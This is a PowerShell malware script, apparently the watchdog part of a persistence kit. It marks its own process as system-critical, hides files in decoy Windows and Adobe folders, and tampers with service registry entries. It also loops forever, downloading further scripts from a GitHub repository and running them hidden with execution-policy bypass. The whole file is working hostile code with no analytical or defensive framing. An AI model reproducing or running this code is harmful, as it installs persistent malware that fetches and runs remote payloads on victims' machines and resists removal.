#script must run as admin/SYSTEM
param(
    [string]$rootPath,
    [string]$basePath,
    [string]$childServiceName,
    [string]$childServicePropertyName,
    [string]$parentServicePropertyName
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]


$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
)

$mutexName = "Global\MyUniquePrion"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)

$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

if($basePath -eq "" -or $childServiceName -eq "" -or $childServicePropertyName -eq ""){
    $mutex.WaitOne()
    try {
        if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
            $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $pa = "$pa\async_fun.vbs"
            iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
            wscript.exe $pa
            New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
        }
    }
    finally {
        $mutex.ReleaseMutex()
        exit
    }
}

$b = $basePath -replace '([\\{}])', '`$1'
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"

$parentPath = ""


$item = Get-ItemProperty -Path "$basePath" -Name $childServicePropertyName -ErrorAction SilentlyContinue
$canUpdateRootPath = $false

if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $true
}

if (-not($item)) {
    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $false
}

else{
    $rootPath = $item.$childServicePropertyName
    $canUpdateRootPath = $true
}

$item2 = Get-ItemProperty -Path "$basePath" -Name $parentServicePropertyName -ErrorAction SilentlyContinue
if($item2){
    $parentPath = $item2.$parentServicePropertyName
}

$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$initServicePath = $paths[$idx]
$initServicePath = "$initServicePath\init_service_root.ps1"

function Check-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Check-Service{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

while ($true) {
    $regS = Check-ServiceReg -path $regPath
    $serv = Check-Service -name $childServiceName

    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
        if($canUpdateRootPath){
            $idx = Get-Random -Minimum 0 -Maximum $paths.Length
            $initServicePath = $paths[$idx]
            $initServicePath = "$initServicePath\init_service_root.ps1"
            $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootPath = "$rootPath\root.ps1"
            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $rootPath -Force | Out-Null
        }
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    
    elseif($regS -or $serv){
        $idx = Get-Random -Minimum 0 -Maximum $paths.Length
        $initServicePath = $paths[$idx]
        $initServicePath = "$initServicePath\init_service_root.ps1"
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    $canUpdateRootPath=$true

    if(-not(Test-Path -Path $parentPath -PathType Leaf)){
        $initParentServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $initParentServicePath = "$initParentServicePath\init_service_rootmonmon.ps1"
        $parentPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $parentPath = "$parentPath\root_mon_mon.ps1"
        Set-ItemProperty -Path "$basePath" -Name $parentServicePropertyName -Value $parentPath -Force | Out-Null
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1" -OutFile $initParentServicePath
        powershell.exe -ep bypass -noP -w hidden $initParentServicePath -rootPath $rootPath -basePath "$b"
    }
    
    Start-Sleep -Seconds 2
}